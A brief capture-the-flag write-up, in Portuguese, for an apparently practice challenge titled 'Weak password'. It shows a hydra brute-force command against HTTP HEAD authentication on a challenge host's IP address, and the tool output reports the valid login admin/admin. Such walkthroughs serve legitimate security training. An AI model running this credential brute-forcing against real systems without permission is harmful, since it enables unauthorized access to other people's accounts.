# Weak password

Efetuando um brute-force com hydra:

<pre>root@kali:~# hydra -L user.txt -P pass.txt 212.129.38.224 http-head /web-serveur/ch3/
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-02-02 19:09:50
[WARNING] http-head auth does not work with every server, better use http-get
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking http-head://212.129.38.224:80/web-serveur/ch3/
[80][http-head] host: 212.129.38.224   login: admin   password: admin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-02 19:09:51<pre>
